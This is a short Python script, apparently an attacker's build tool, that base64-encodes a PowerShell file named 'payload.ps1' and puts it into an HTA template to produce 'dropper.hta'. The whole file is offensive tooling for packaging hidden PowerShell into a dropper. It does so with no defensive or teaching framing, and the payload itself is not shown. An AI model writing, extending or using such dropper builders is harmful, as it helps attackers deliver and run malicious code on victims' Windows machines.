import base64

def build(encoded_ps):
    template = open("template.hta").read()
    with open("dropper.hta", "w") as f:
        f.write(template.replace("{{ENCODED_PS}}", encoded_ps))
    print("[+] dropper.hta created.")

if __name__ == "__main__":
    ps_code = open("payload.ps1").read().encode()
    encoded = base64.b64encode(ps_code).decode()
    build(encoded)
